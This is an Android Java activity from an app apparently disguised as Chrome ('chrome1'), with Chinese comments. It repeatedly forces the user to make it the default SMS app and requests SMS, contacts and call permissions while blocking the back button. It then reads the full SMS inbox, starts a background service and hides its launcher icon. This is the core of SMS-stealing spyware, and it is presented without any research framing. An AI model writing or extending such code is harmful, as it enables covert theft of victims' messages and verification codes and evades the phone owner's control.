package com.example.chrome1.activity;

import android.app.Activity;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Telephony;
import android.util.Log;
import android.view.KeyEvent;

import com.example.chrome1.BootService;

public class OnePiexlActivity extends Activity {
    private static final int PERMISSION_REQUEST_CAMERA = 12;
    private final String TAG = "OnePiexlActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        initPermission(this);
        a();
        requestPermissions(new String[]{"android.permission.BROADCAST_WAP_PUSH", "android.permission.SEND_SMS", "android.permission.RECEIVE_SMS"}, 123);
        super.onCreate(savedInstanceState);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        System.out.println("错误" + requestCode + "内容" + resultCode);
        //没有给权限不让走
        if (requestCode == 10 && resultCode == 0) {
            initPermission(this);
        } else if (requestCode == 11 && resultCode == 0) {
            a();
        } else if (requestCode == 123) {
            requestPermissions(new String[]{"android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.READ_PHONE_STATE", "android.permission.READ_CONTACTS", "android.permission.CALL_PHONE"}, 124);
        } else if (requestCode == 124) {

        } else if (requestCode == 10 && resultCode == -1) {
            //访问内容提供者获取短信
            ContentResolver cr = getContentResolver();
            //            短信内容提供者的主机名
            Cursor cursor = cr.query(Uri.parse("content://sms"), new String[]{"address", "date", "body", "type"}, null, null, null);
            //已经拥有权限了
            startService(new Intent(this, BootService.class));
            chaneIcon();
        }
    }

    void a() {
        if (Build.VERSION.SDK_INT >= 23) {
            try {
                PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
                if (powerManager == null) {
                    return;
                }
                boolean isIgnoringBatteryOptimizations = powerManager.isIgnoringBatteryOptimizations(getPackageName());
                Log.d("ibo", "" + isIgnoringBatteryOptimizations);
                if (!isIgnoringBatteryOptimizations) {
                    Intent intent = new Intent();
                    intent.setAction("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS");
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivityForResult(intent, 11);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    //隐藏logo但是会kill应用
    private void chaneIcon() {
        //获取packageManager
        PackageManager packageManager = getPackageManager();
        //取消设置当前mainactivity为启动页
        packageManager.setComponentEnabledSetting(new ComponentName(this, OnePiexlActivity.class), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        //设置newsyeas为启动页
        packageManager.setComponentEnabledSetting(new ComponentName(this, getPackageName() + ".changeAfter"), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    void initPermission(Activity activity) {
        String defaultSmsApp = Telephony.Sms.getDefaultSmsPackage(this);//获取手机当前设置的默认短信应用的包名
        String packageName = activity.getPackageName();
        if (defaultSmsApp == null) {
            return;
        }
        if (!defaultSmsApp.equals(packageName)) {
            Intent intent = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
            intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, packageName);
            startActivityForResult(intent, 10);
        }
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            //按键按下时返回处理逻辑可以放在这里
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }

    @Override
    public boolean onKeyUp(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            //按键释放时返回处理逻辑可以放在这里
            return true;
        }
        return super.onKeyUp(keyCode, event);
    }

    @Override
    public void onResume() {
        super.onResume();
    }

}
